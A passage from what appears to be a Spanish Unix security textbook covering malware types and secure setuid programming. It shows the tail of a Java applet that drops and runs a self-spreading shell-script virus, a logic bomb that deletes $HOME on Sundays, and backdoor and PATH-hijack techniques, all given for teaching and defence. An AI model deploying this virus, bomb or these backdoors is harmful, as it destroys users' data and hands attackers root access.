&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;echo&#x00A0;&#x005C;&#x0022;Java&#x00A0;is&#x00A0;safe,&#x00A0;and&#x00A0;UNIX&#x00A0;viruses&#x00A0;do&#x00A0;not&#x00A0;exist.&#x005C;&#x0022;&#x0022;&#x00A0;+&#x00A0;&#x0022;&#x005C;n&#x0022;&#x00A0;+
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;for&#x00A0;file&#x00A0;in&#x00A0;&#x2018;find&#x00A0;&#x0022;&#x00A0;+&#x00A0;target&#x00A0;+&#x00A0;&#x0022;&#x00A0;-type&#x00A0;f&#x00A0;-print&#x2018;&#x0022;&#x00A0;+&#x00A0;&#x0022;&#x005C;n&#x0022;&#x00A0;+&#x00A0;&#x0022;do&#x0022;&#x00A0;+
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;&#x005C;n&#x0022;&#x00A0;+&#x00A0;&#x0022;&#x00A0;&#x00A0;&#x00A0;&#x00A0;case&#x00A0;&#x005C;&#x0022;&#x2018;sed&#x00A0;1q&#x00A0;$file&#x2018;&#x005C;&#x0022;&#x00A0;in&#x0022;&#x00A0;+&#x00A0;&#x0022;&#x005C;n&#x0022;&#x00A0;+
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x005C;&#x0022;#!/bin/sh&#x005C;&#x0022;&#x00A0;)&#x00A0;grep&#x00A0;&#x2019;#-&#x005F;&#x2019;&#x00A0;$file&#x00A0;&#x003E;&#x00A0;/dev/null&#x0022;&#x00A0;+
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;&#x00A0;||&#x00A0;sed&#x00A0;-n&#x00A0;&#x2019;/#-&#x005F;/,$p&#x2019;&#x00A0;$0&#x00A0;&#x003E;&#x003E;&#x00A0;$file&#x0022;&#x00A0;+&#x00A0;&#x0022;&#x005C;n&#x0022;&#x00A0;+
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;&#x00A0;&#x00A0;&#x00A0;&#x00A0;esac&#x0022;&#x00A0;+&#x00A0;&#x0022;&#x005C;n&#x0022;&#x00A0;+&#x00A0;&#x0022;done&#x0022;&#x00A0;+&#x00A0;&#x0022;&#x005C;n&#x0022;&#x00A0;+
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;2&#x003E;/dev/null&#x0022;;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;byte[]&#x00A0;buffer&#x00A0;=&#x00A0;new&#x00A0;byte[homer.length()];
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;homer.getBytes(0,&#x00A0;homer.length(),&#x00A0;buffer,&#x00A0;0);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;outer.write(buffer);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;outer.close();
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Process&#x00A0;chmod&#x00A0;=&#x00A0;Runtime.getRuntime().exec(&#x0022;/usr/bin/chmod&#x00A0;777&#x00A0;&#x0022;&#x00A0;+
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;userHome&#x00A0;+&#x00A0;&#x0022;/.homer.sh&#x0022;);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Process&#x00A0;exec&#x00A0;=&#x00A0;Runtime.getRuntime().exec(&#x0022;/bin/sh&#x00A0;&#x0022;&#x00A0;+&#x00A0;userHome&#x00A0;+
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;/.homer.sh&#x0022;);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;}&#x00A0;catch&#x00A0;(IOException&#x00A0;ioe)&#x00A0;{}
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;}
&#x00A0;}
&#x00A0;anita:~/Security#
</literallayout>
<!--l. 670--><para>Este programa infecta los sistemas Unix con un virus que contamina &#xFB01;cheros shellscript; antes de hacerlo
muestra el mensaje &#x2018;Java is safe, and UNIX viruses do not exist&#x2019;, para despu&#x00E9;s localizar todos los
&#xFB01;cheros shell en el directorio $HOME, comprobar cu&#x00E1;les est&#x00E1;n infectados, e infectar los que no lo
est&#x00E1;n.
<!--br/-->
<!--br/-->Aunque en un principio no se tom&#x00F3; muy en serio el problema de los applets hostiles, poco tiempo despu&#x00E9;s la
propia Sun Microsystems reconoci&#x00F3; la problem&#x00E1;tica asociada y se puso a trabajar para minimizar los
potenciales efectos de estos applets; principalmente se han centrado esfuerzos en controlar la cantidad de
recursos consumidos por un programa y en proporcionar las clases necesarias para que los propios
navegadores monitoricen los applets ejecutados. No obstante, aunque se solucionen los problemas de
seguridad en el c&#x00F3;digo, es probable que se puedan seguir utilizando applets como una forma de ataque a los
sistemas: mientras que estos programas puedan realizar conexiones por red, no habr&#x00E1;n desaparecido los
problemas.
  </para></section><!--end subsection--><!--l. 685--><section 
role="subsection"><title><abbrev role="title-mark">5.4.6</abbrev><anchor 
   id="x1-770005.4.6"  ></anchor>Bombas l&#x00F3;gicas</title>
<!--l. 686--><para>  Las bombas l&#x00F3;gicas son en cierta forma similares a los troyanos: se trata de c&#x00F3;digo insertado en programas
que parecen realizar cierta acci&#x00F3;n &#x00FA;til. Pero mientras que un troyano se ejecuta cada vez que se
ejecuta el programa que lo contiene, una bomba l&#x00F3;gica s&#x00F3;lo se activa bajo ciertas condiciones,
como una determinada fecha, la existencia de un &#xFB01;chero con un nombre dado, o el alcance de
cierto n&#x00FA;mero de ejecuciones del programa que contiene la bomba; as&#x02CA;&#x0131;, una bomba l&#x00F3;gica puede

permanecer inactiva en el sistema durante mucho tiempo sin activarse y por tanto sin que
nadie note un funcionamiento an&#x00F3;malo hasta que el da~no producido por la bomba ya est&#x00E1; hecho.
Por ejemplo, imaginemos la misma situaci&#x00F3;n que antes ve&#x02CA;&#x0131;amos para el troyano: alguien con
el su&#xFB01;ciente privilegio renombra a vi como vi.old, y en el lugar del editor sit&#x00FA;a el siguiente
c&#x00F3;digo:

     </para><literallayout role="verbatim">
&#x00A0;#!/bin/sh
&#x00A0;if&#x00A0;[&#x00A0;&#x2018;date&#x00A0;+%a&#x2018;&#x00A0;=&#x00A0;&#x0022;Sun&#x0022;&#x00A0;];
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;rm&#x00A0;-rf&#x00A0;$HOME
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;else
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;vi.old&#x00A0;$1
&#x00A0;fi
</literallayout>
<!--l. 711--><para>Este cambio en el sistema puede permanecer durante
a~nos <anchor 
   id="x1-77001f4"  ></anchor><footnote><para>     Obviamente, si esto es as&#x02CA;&#x0131;, denota una escasa preocupaci&#x00F3;n por la seguridad en ese sistema.</para></footnote> sin
que se produzca un funcionamiento an&#x00F3;malo, siempre y cuando nadie edite &#xFB01;cheros un domingo; pero en el
momento en que un usuario decida trabajar este d&#x02CA;&#x0131;a, la bomba l&#x00F3;gica se va a activar y el directorio de este
usuario ser&#x00E1; borrado.
  </para></section><!--end subsection--><!--l. 717--><section 
role="subsection"><title><abbrev role="title-mark">5.4.7</abbrev><anchor 
   id="x1-780005.4.7"  ></anchor>Canales ocultos</title>
<!--l. 718--><para>  Seg&#x00FA;n <citation>[?]</citation> un canal oculto es un cauce de comunicaci&#x00F3;n que permite a un proceso receptor y a un emisor
intercambiar informaci&#x00F3;n de forma que viole la pol&#x02CA;&#x0131;tica de seguridad del sistema; esencialmente se trata de
un m&#x00E9;todo de comunicaci&#x00F3;n que no es parte del dise~no original del sistema pero que puede utilizarse para
transferir informaci&#x00F3;n a un proceso o usuario que a priori no estar&#x02CA;&#x0131;a autorizado a acceder a dicha
informaci&#x00F3;n. Los canales ocultos existen s&#x00F3;lamente en sistemas con seguridad multinivel (<citation>[?]</citation>), aquellos que
contienen y manejan informaci&#x00F3;n con diferentes niveles de sensibilidad, de forma que se permite acceder
simult&#x00E1;neamente a varios usuarios a dicha informaci&#x00F3;n pero con diferentes puntos de vista de la
misma, en funci&#x00F3;n de sus privilegios y sus necesidades de conocimiento (needs to know). El
concepto de canal oculto fu&#x00E9; introducido en 1973, en <citation>[?]</citation>, y desde entonces muchos han sido los
estudios realizados sobre este m&#x00E9;todo de ataque, que afecta especialmente a sistemas en los
que el aspecto m&#x00E1;s importante de la seguridad es la privacidad de los datos (por ejemplo, los
militares).
<!--br/-->
<!--br/-->Generalmente se suelen clasi&#xFB01;car los canales cubiertos en funci&#x00F3;n de varios aspectos (<citation>[?]</citation>):
     </para><itemizedlist>
     <listitem>
     <!--l. 737--><para>Escenario
     <!--br/-->Cuando se construyen escenarios de canales cubiertos generalmente se suele diferenciar entre
     canales cubiertos de almacenamiento y de temporizaci&#x00F3;n (<citation>[?]</citation>). Los primeros son canales
     en los que se utiliza la escritura directa o indirecta de datos por parte de un proceso y la
     lectura &#x2013; tambi&#x00E9;n directa o indirecta &#x2013; de esos datos por parte de otro; generalmente utilizan
     un recurso &#xFB01;nito del sistema, como bloques de disco, que se comparte entre entidades con
     diferentes privilegios. Por contra, los canales ocultos de temporizaci&#x00F3;n utilizan la modulaci&#x00F3;n
     de ciertos recursos, como el tiempo de CPU, para intercambiar la informaci&#x00F3;n entre procesos.
     En <citation>[?]</citation> se pueden encontrar ejemplos de ambos tipos de canales ocultos; otro buen ejemplo de
     covert channel se encuentra en <citation>[?]</citation>.
     </para></listitem>
     <listitem>
     <!--l. 749--><para>Ruido
     <!--br/-->Como cualquier canal de comunicaci&#x00F3;n, oculto o no, los canales cubiertos pueden ser ruidosos o
     inmunes al ruido; idealmente, un canal inmune al ruido es aqu&#x00E9;l en que la probabilidad de que
     el receptor escuche exactamente lo que el emisor ha transmitido es 1: sin importar factores
     externos, no hay interferencias en la transmisi&#x00F3;n. Evidentemente, en la pr&#x00E1;ctica es muy dif&#x02CA;&#x0131;cil
     conseguir estos canales tan perfectos, por lo que es habitual aplicar c&#x00F3;digos de correcci&#x00F3;n de
     errores aunque &#x00E9;stos reduzcan el ancho de banda del canal.

     </para></listitem>
     <listitem>
     <!--l. 758--><para>Flujos de informaci&#x00F3;n
     <!--br/-->De la misma forma que en las l&#x02CA;&#x0131;neas convencionales de transmisi&#x00F3;n de datos se aplican t&#x00E9;cnicas
     (multiplexaci&#x00F3;n en el tiempo, multiplexaci&#x00F3;n en frecuencia&#x2026;) para maximizar el ancho de banda
     efectivo, en los canales cubiertos se puede hacer algo parecido. A los canales en los que se
     transmiten varios &#xFB02;ujos de informaci&#x00F3;n entre emisor y receptor se les denomina agregados, y
     dependiendo de c&#x00F3;mo se inicialicen, lean y reseteen las variables enviadas podemos hablar de
     agregaci&#x00F3;n serie, paralela o h&#x02CA;&#x0131;brida; los canales con un &#x00FA;nico &#xFB02;ujo de informaci&#x00F3;n se llaman no
     agregados.</para></listitem></itemizedlist>
<!--l. 769--><para>La preocupaci&#x00F3;n por la presencia de canales ocultos es, como hemos dicho, habitual en sistemas de alta
seguridad como los militares; de hecho, muchos de los estudios sobre ataques basados en canales
cubiertos y su prevenci&#x00F3;n han sido &#x2013; y son &#x2013; realizados por las cl&#x00E1;sicas agencias gubernamentales
y militares estadounidenses (National Security Agency, US Air Force, National Computer
Security Center&#x2026;). No obstante, tambi&#x00E9;n en entornos m&#x00E1;s &#x2018;normales&#x2019; es posible la existencia de
canales ocultos, especialmente aprovechando debilidades de la pila de protocolos TCP/IP (<citation>[?]</citation>,
<citation>[?]</citation>&#x2026;).
<!--br/-->
<!--br/-->El an&#x00E1;lisis y detecci&#x00F3;n canales cubiertos es una tarea complicada que generalmente se basa en
complejos modelos formales y matem&#x00E1;ticos (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;); diversas aproximaciones son utilizadas para el
estudio de canales de temporizaci&#x00F3;n (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;), y tambi&#x00E9;n para el de canales de almacenamiento
(<citation>[?]</citation>).
  </para></section><!--end subsection--><!--l. 784--><section 
role="subsection"><title><abbrev role="title-mark">5.4.8</abbrev><anchor 
   id="x1-790005.4.8"  ></anchor>Puertas traseras</title>
<!--l. 785--><para>  Las puertas traseras son trozos de c&#x00F3;digo en un programa que permiten a qui&#x00E9;n conoce su
funcionamiento saltarse los m&#x00E9;todos usuales de autenticaci&#x00F3;n para realizar cierta tarea. Habitualmente
son insertados por los programadores para agilizar la tarea de probar su c&#x00F3;digo durante la
fase de desarrollo del mismo y se eliminan en el producto &#xFB01;nal, pero en ciertas situaciones el
programador puede mantener estas puertas traseras en el programa funcional, ya sea deliberada o
involuntariamente. Por ejemplo, imaginemos una aplicaci&#x00F3;n que para realizar cualquier tarea de seguridad
solicita a quien lo ejecuta cinco claves diferentes; evidentemente, durante la fase de desarrollo
es muy inc&#x00F3;modo para el programador teclear estas contrase~nas antes de ver si el producto
funciona correctamente, por lo que es muy com&#x00FA;n que esta persona decida incluir una rutina en
el c&#x00F3;digo de forma que si la primera clave proporcionada es una determinada no se soliciten
las cuatro restantes. Esta situaci&#x00F3;n, aceptable durante la fase de desarrollo, se convierte en
una amenaza a la seguridad si se mantiene una vez el producto est&#x00E1; instalado en un sistema
real: cualquiera que conozca la clave inicial puede saltarse todo el mecanismo de protecci&#x00F3;n del
programa.
<!--br/-->
<!--br/-->Aparte de puertas traseras en los programas, es posible &#x2013; y t&#x02CA;&#x0131;pico &#x2013; situar puertas traseras en ciertos
&#xFB01;cheros vitales para el sistema; generalmente, cuando un atacante consigue acceso a una m&#x00E1;quina Unix
desea mantener ese acceso aunque su penetraci&#x00F3;n sea detectada. Por ejemplo, algo muy habitual es a~nadir
un usuario con UID 0 en el &#xFB01;chero de claves, de forma que el pirata pueda seguir accediendo al sistema
con ese nuevo login aunque el administrador cierre la puerta que antes hab&#x02CA;&#x0131;a utilizado para
entrar. Tambi&#x00E9;n es cl&#x00E1;sico a~nadir un nuevo servicio en un puerto no utilizado, de forma que
haciendo telnet a ese n&#x00FA;mero de puerto se abra un shell con privilegios de root; incluso muchos
atacantes utilizan la facilidad cron para chequear peri&#x00F3;dicamente estos archivos e insertar las
puertas traseras de nuevo en caso de que hayan sido borradas. &#x00BF;Qu&#x00E9; hacer para evitar estos
ataques? La prevenci&#x00F3;n pasa por comprobar peri&#x00F3;dicamente la integridad de los archivos m&#x00E1;s
importantes (&#xFB01;cheros de contrase~nas, spoolers, con&#xFB01;guraci&#x00F3;n de la red, programas del arranque de
m&#x00E1;quina&#x2026;); tambi&#x00E9;n es conveniente rastrear la existencia de nuevos archivos setuidados que
puedan &#x2018;aparecer&#x2019; en los sistemas de &#xFB01;cheros: cualquier nuevo programa de estas caracter&#x02CA;&#x0131;sticas
suele indicar un ataque exitoso, y una puerta trasera &#x2013; generalmente un shell setuidado &#x2013;
colocada en nuestra m&#x00E1;quina. Los m&#x00E1;s paranoicos no deben olvidar efectuar una b&#x00FA;squeda bajo los
dispositivos montados (existen utilidades para hacerlo), ya que un find normal no suele encontrar

&#xFB01;cheros setuidados que se guarden en un directorio que es a su vez punto de montaje para otra
unidad.
  </para></section><!--end subsection--><!--l. 825--><section 
role="subsection"><title><abbrev role="title-mark">5.4.9</abbrev><anchor 
   id="x1-800005.4.9"  ></anchor>Superzapping</title>
<!--l. 826--><para>  Este problema de seguridad deriva su nombre del programa superzap, una utilidad de los antiguos
mainframes de IBM que permit&#x02CA;&#x0131;a a qui&#x00E9;n lo ejecutaba pasar por alto todos los controles de seguridad para
realizar cierta tarea administrativa, presumiblemente urgente; se trataba de un &#x2018;Rompa el cristal en caso
de emergencia&#x2019; que estos sistemas pose&#x02CA;&#x0131;an, o de una llave maestra capaz de abrir todas las puertas.
Obviamente, el problema sucede cuando la llave se pierde y un atacante la utiliza en bene&#xFB01;cio
propio.
<!--br/-->
<!--br/-->Como es normal, este tipo de programas no suele encontrarse en los sistemas modernos por los graves
problemas de seguridad que su existencia implica: imaginemos un shell setuidado como root y guardado en
/tmp/, de forma que si el sistema funciona an&#x00F3;malamente cualquiera puede ejecutarlo para solucionar el
posible problema. Parece obvio que para un atacante ser&#x02CA;&#x0131;a un gran avance disponer de esta herramienta.
De cualquier forma, no es habitual clasi&#xFB01;car a los programas superzap como malware, ya que en principio
se trata de aplicaciones leg&#x02CA;&#x0131;timas, incluso necesarias en determinadas situaciones; es, como
sucede en muchos casos, su mal uso y no el programa en s&#x02CA;&#x0131; lo que constituye una amenaza a la
seguridad.
<!--br/-->
<!--br/-->El ejemplo t&#x02CA;&#x0131;pico (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;) de problemas derivados del superzapping es un caso ocurrido en Nueva Jersey
que caus&#x00F3; la p&#x00E9;rdida de 128.000 d&#x00F3;lares de los a~nos setenta. El operador de un sistema bancario estaba
utilizando un programa superzap para corregir balances en el estado de las cuentas cuando un error simple
le demostr&#x00F3; lo f&#x00E1;cil que pod&#x02CA;&#x0131;a modi&#xFB01;car registros sin que el sistema de auditor&#x02CA;&#x0131;a lo detectara; aprovech&#x00F3; esta
situaci&#x00F3;n para transferir dinero a tres cuentas, y dado que no dej&#x00F3; huellas la &#x00FA;nica forma de detectar el fraude
fu&#x00E9; la r&#x00E1;pida reacci&#x00F3;n del banco ante la queja de un usuario &#x2013; y un exhaustivo an&#x00E1;lisis del estado de todas las
cuentas.
  </para></section><!--end subsection--><!--l. 854--><section 
role="subsection"><title><abbrev role="title-mark">5.4.10</abbrev><anchor 
   id="x1-810005.4.10"  ></anchor>Programas salami</title>
<!--l. 855--><para>  Las t&#x00E9;cnicas salami se utilizan para desviar peque~nas cantidades de bienes &#x2013; generalmente dinero &#x2013; de
una fuente con un gran cantidad de los mismos; de la misma forma que de un salami se cortan
peque~nas rodajas sin que el total sufra una reducci&#x00F3;n considerable, un programa salami roba
peque~nas cantidades de dinero, de forma que su acci&#x00F3;n pasa inadvertida. Aunque su efecto es
especialmente grave en entornos bancarios y no en sistemas habituales, en este trabajo vamos a
hablar brevemente de los programas salami ya que se pueden utilizar para atacar equipos Unix
dedicados a operaciones &#xFB01;nancieras, como la gesti&#x00F3;n de n&#x00F3;minas de personal o la asignaci&#x00F3;n de
becas.
<!--br/-->
<!--br/-->El principal problema de los programas salami es que son extremadamente dif&#x02CA;&#x0131;ciles de detectar, y s&#x00F3;lo una
compleja auditor&#x02CA;&#x0131;a de cuentas puede sacar a la luz estos fraudes. Si un programador es lo
su&#xFB01;cientemente inteligente como para insertar malware de este tipo en los sistemas de un banco
para el cual trabaja (si se tratara de un atacante externo la probabilidad de ataque ser&#x02CA;&#x0131;a casi
despreciable), seguramente conoce a la perfecci&#x00F3;n todos los entresijos de dicho banco, de forma
que no le ser&#x00E1; dif&#x02CA;&#x0131;cil desviar fondos a cuentas que no son la suya, comprobar si se sobrepasa
un cierto umbral en dichas cuentas &#x2013; umbral a partir del cual el banco &#x2018;se interesar&#x02CA;&#x0131;a&#x2019; por
el propietario de la cuenta &#x2013; o incluso utilizar nombres falsos o cuentas externas a las que
desviar el dinero. Contra esto, una de las pocas soluciones consiste en vigilar de cerca las
cuentas de los empleados y sus allegados, as&#x02CA;&#x0131; como estar atentos a posibles cambios en su modo
de vida: un coche de lujo de una persona con un sueldo normal, viajes caros, demasiadas
ostentaciones&#x2026;pueden ser signo de un fraude; evidentemente, es necesario consultar con un gabinete
jur&#x02CA;&#x0131;dico la legalidad o ilegalidad de estas acciones, que pueden constituir una invasi&#x00F3;n a la privacidad del
trabajador. Por supuesto, la soluci&#x00F3;n ideal ser&#x02CA;&#x0131;a comprobar l&#x02CA;&#x0131;nea a l&#x02CA;&#x0131;nea todo el software del banco,
pero pocos auditores tienen los conocimientos &#x2013; y la paciencia &#x2013; su&#xFB01;cientes para realizar esta
tarea.

<!--br/-->
<!--br/-->Un caso particular de programa salami lo constituyen los programas de redondeo hacia abajo o round
down. Este fraude consiste en aprovechar c&#x00E1;lculos de los sistemas bancarios que obtienen cantidades de
dinero m&#x00E1;s peque~nas que la moneda de menor valor (en el caso de Espa~na, cantidades de c&#x00E9;ntimos); por
ejemplo, imaginemos que alguien tiene ingresadas 123.523 pesetas a un inter&#x00E9;s del 2&#x2019;5 %; los cr&#x00E9;ditos le
reditar&#x00E1;n un total de 3088&#x2019;075 pesetas, que autom&#x00E1;ticamente para el banco se transformar&#x00E1;n en 3088. Si esos
7&#x2019;5 c&#x00E9;ntimos se acumulan en otro c&#x00E1;lculo con cantidades igual de despreciables, se llegar&#x00E1; tarde o temprano a
un punto en el que la cantidad total de dinero sea lo su&#xFB01;cientemente apetecible para un atacante dispuesto
a aprovechar la situaci&#x00F3;n. Si pensamos que millones de estos c&#x00E1;lculos se realizan diariamente en todos los
bancos de Espa~na, podemos hacernos una idea del poco tiempo que tardar&#x00E1; la cuenta de un pirata en
llenarse.
  </para></section><!--end subsection--></section><!--end section--><!--l. 899--><section 
role="section"><title><abbrev role="title-mark">5.5</abbrev><anchor 
   id="x1-820005.5"  ></anchor>Programaci&#x00F3;n segura</title>
<!--l. 901--><para>  Parece obvio que despu&#x00E9;s de analizar los problemas que un c&#x00F3;digo malicioso o simplemente mal dise~nado
puede causar, dediquemos un apartado a comentar brevemente algunos aspectos a tener en
cuenta a la hora de crear programas seguros. Vamos a hablar de programaci&#x00F3;n en C, obviamente
por ser el lenguaje m&#x00E1;s utilizado en Unix; para aquellos interesados en la seguridad de otros
lenguajes que tambi&#x00E9;n se utilizan en entornos Unix, existen numerosos art&#x02CA;&#x0131;culos que hablan de
la programaci&#x00F3;n segura &#x2013; e insegura &#x2013; en lenguajes que van desde Java (<citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>&#x2026;) a SQL
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->El principal problema de la programaci&#x00F3;n en Unix lo constituyen los programas setuidados; si un programa
sin este bit activo tiene un fallo, lo normal es que ese fallo solamente afecte a quien lo ejecuta. Al
tratarse de un error de programaci&#x00F3;n, algo no intencionado, su primera consecuencia ser&#x00E1; el mal
funcionamiento de ese programa. Este esquema cambia radicalmente cuando el programa est&#x00E1; setuidado:
en este caso, el error puede comprometer tanto a quien lo ejecuta como a su propietario, y
como ese propietario es por norma general el root autom&#x00E1;ticamente se compromete a todo el
sistema. Para la codi&#xFB01;caci&#x00F3;n segura de este tipo de programas, <citation>[?]</citation> proporciona unas l&#x02CA;&#x0131;neas
b&#x00E1;sicas:
     </para><itemizedlist>
     <listitem>
     <!--l. 921--><para>M&#x00E1;ximas restricciones a la hora de elegir el UID y el GID.
     <!--br/-->Una medida de seguridad b&#x00E1;sica que todo administrador de sistemas Unix ha de seguir es
     realizar todas las tareas con el m&#x02CA;&#x0131;nimo privilegio que estas requieran (<citation>[?]</citation>); as&#x02CA;&#x0131;, a nadie se le
     ocurre (o se le deber&#x02CA;&#x0131;a ocurrir) conectar a IRC o aprender a manejar una aplicaci&#x00F3;n gen&#x00E9;rica
     bajo la identidad de root. Esto es directamente aplicable a la hora de programar: cuando
     se crea un programa setuidado (o setgidado) se le ha de asignar tanto el UID como el GID
     menos peligroso para el sistema. Por ejemplo, si un programa servidor se limita a mostrar un
     mensaje en pantalla y adem&#x00E1;s escucha en un puerto por encima de 1024, no necesita para nada
     estar setuidado a nombre de root (realmente, es poco probable que ni siquiera necesite estar
     setuidado); si pensamos en un posible error en dicho programa que permita a un atacante
     obtener un shell vemos claramente que cuanto menos privilegio tenga el proceso, menos malas
     ser&#x00E1;n las posibles consecuencias de tal error.
     </para></listitem>
     <listitem>
     <!--l. 937--><para>Reset de los UIDs y GIDs efectivos antes de llamar a exec().
     <!--br/-->Uno de los grandes problemas de los programas setuidados es la ejecuci&#x00F3;n de otros programas
     de manera inesperada; por ejemplo, si el usuario introduce ciertos datos desde teclado, datos
     que se han de pasar como argumento a otra aplicaci&#x00F3;n, nada nos asegura a priori que esos
     datos sean correctos o coherentes. Por tanto, parece obvio resetear el UID y el GID efectivos
     antes de invocar a exec(), de forma que cualquier ejecuci&#x00F3;n inesperada se realice con el m&#x02CA;&#x0131;nimo
     privilegio necesario; esto tambi&#x00E9;n es aplicable a funciones que indirectamente realicen el exec(),
     como system() o popen().

     </para></listitem>
     <listitem>
     <!--l. 947--><para>Es necesario cerrar todos los descriptores de &#xFB01;chero, excepto los estrictamente necesarios,
     antes de llamar a exec().
     <!--br/-->Los descriptores de &#xFB01;cheros son un par&#x00E1;metro que los procesos Unix heredan de sus padres;
     de esta forma, si un programa setuidado est&#x00E1; leyendo un archivo, cualquier proceso hijo tendr&#x00E1;
     acceso a ese archivo a no ser que expl&#x02CA;&#x0131;citamente se cierre su descriptor antes de ejecutar el
     exec().
     <!--br/-->
     <!--br/-->La forma m&#x00E1;s f&#x00E1;cil de prevenir este problema es activando un &#xFB02;ag que indique al sistema que ha
     de cerrar cierto descriptor cada vez que se invoque a exec(); esto se consigue mediante las
     llamadas fcntl() e ioctl().
     </para></listitem>
     <listitem>
     <!--l. 957--><para>Hay que asegurarse de que chroot() realmente restringe.
     <!--br/-->Los enlaces duros entre directorios son algo que el n&#x00FA;cleo de muchos sistemas Unix no permiten
     debido a que genera bucles en el sistema de &#xFB01;cheros, algo que crea problemas a determinadas
     aplicaciones; por ejemplo, Linux no permite crear estos enlaces, pero Solaris o Minix s&#x02CA;&#x0131;. En
     estos &#x00FA;ltimos, en los clones de Unix que permiten hard links entre directorios, la llamada
     chroot() puede perder su funcionalidad: estos enlaces pueden seguirse aunque no se limiten
     al entorno con el directorio ra&#x02CA;&#x0131;z restringido. Es necesario asegurarse de que no hay directorios
     enlazados a ninguno de los contenidos en el entorno chroot() (podemos verlo con la opci&#x00F3;n
     &#x2018;-l&#x2019; de la orden ls, que muestra el n&#x00FA;mero de enlaces de cada archivo).
     </para></listitem>
     <listitem>
     <!--l. 969--><para>Comprobaciones del entorno en que se ejecutar&#x00E1; el programa.
     <!--br/-->En Unix todo proceso hereda una serie de variables de sus progenitores, como el umask, los
     descriptores de &#xFB01;cheros, o ciertas variables de entorno ($PATH, $IFS&#x2026;); para una ejecuci&#x00F3;n segura, es
     necesario controlar todos y cada uno de estos elementos que afectan al entorno de un
     proceso. Especialmente cr&#x02CA;&#x0131;ticas son las funciones que dependen del shell para ejecutar un
     programa, como system() o execvp(): en estos casos es muy dif&#x02CA;&#x0131;cil asegurar que el
     shell va a ejecutar la tarea prevista y no otra. Por ejemplo, imaginemos el siguiente
     c&#x00F3;digo:

         </para><literallayout role="verbatim">
&#x00A0;#include&#x00A0;&#x003C;stdlib.h&#x003E;
&#x00A0;
&#x00A0;main(){
&#x00A0;&#x00A0;&#x00A0;system(&#x0022;ls&#x0022;);
&#x00A0;}
</literallayout>
     <!--l. 988--><para>A primera vista, este programa se va a limitar a mostrar un listado del directorio actual; no
     obstante, si un usuario modi&#xFB01;ca su $PATH de forma que el directorio &#x2018;.&#x2019; ocupe el primer lugar, se
     ejecutar&#x00E1; ./ls en lugar de /bin/ls. Si el programa ./ls fuera una copia del shell, y el c&#x00F3;digo
     anterior estuviera setuidado por el root, cualquier usuario podr&#x02CA;&#x0131;a obtener privilegios de
     administrador.
     <!--br/-->
     <!--br/-->Quiz&#x00E1;s alguien puede pensar que el problema se soluciona si se indica la ruta completa (/bin/ls) en
     lugar de &#x00FA;nicamente el nombre del ejecutable; evidentemente, esto arreglar&#x02CA;&#x0131;a el fallo anterior, pero
     seguir&#x02CA;&#x0131;an siendo factibles multitud de ataques contra el programa. Desde la modi&#xFB01;caci&#x00F3;n del $IFS
     (como veremos m&#x00E1;s adelante) hasta la ejecuci&#x00F3;n en entornos restringidos, existen much&#x02CA;&#x0131;simas t&#x00E9;cnicas
     que hacen muy dif&#x02CA;&#x0131;cil que un programa con estas caracter&#x02CA;&#x0131;sticas pueda ser considerado
     seguro.
     </para></listitem>
     <listitem>
     <!--l. 1002--><para>Nunca setuidar shellscripts.
     <!--br/-->Aunque en muchos sistemas Unix la activaci&#x00F3;n del bit setuid en shellscripts no tiene ning&#x00FA;n efecto,
